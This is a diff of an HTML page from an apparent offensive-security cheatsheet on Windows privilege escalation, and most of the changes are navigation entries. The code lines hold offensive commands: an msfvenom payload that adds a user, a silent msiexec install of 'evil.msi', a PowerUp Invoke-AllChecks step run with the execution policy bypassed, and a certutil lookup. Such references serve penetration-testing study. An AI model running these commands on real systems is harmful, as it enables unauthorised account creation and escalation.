@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:27 CET">
+<meta name="revised" content="2019-11-10T13:28:55 CET">
 <title>Tricks :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1021,6 +1021,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1351,6 +1358,7 @@
       <option value="/windows-systems/privilege-escalation/lsass_mimikatz/" >-- LSASS and Mimikatz</option>
       <option value="/windows-systems/privilege-escalation/tricks/"  selected>-- Tricks</option>
       <option value="/windows-systems/privilege-escalation/windows_defender/" >-- Windows Defender</option>
+      <option value="/windows-systems/privilege-escalation/privexchange/" >-- PrivExchange</option>
   
     <option value="/windows-systems/post-exploitation-techniques/" >
   - 
@@ -1404,6 +1412,7 @@ https://guif.re/windowseop
 https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
 
 https://lolbas-project.github.io/#
+python3 gtfo -e Certutil.exe
 
 <span style="color:#75715e"># You can feed syteminfo output to windows-exploit-suggester</span>
 ./windows-exploit-suggester.py --update
@@ -1497,6 +1506,11 @@ msfvenom -p windows/adduser <span style="color:#111">USER</span><span style="col
 
 <span style="color:#75715e"># You can then use msiexec to execute the payload</span>
 msiexec /quiet /qn /i C:<span style="color:#8045ff">\e</span>vil.msi</code></pre></div>
+<p><br/></p>
+
+<h3 id="powersploit-powerup">PowerSploit / PowerUp</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Copy PowerUp.ps1 to Powershell bypass Execution policy</span>
+Invoke-AllChecks</code></pre></div>
 
     
     
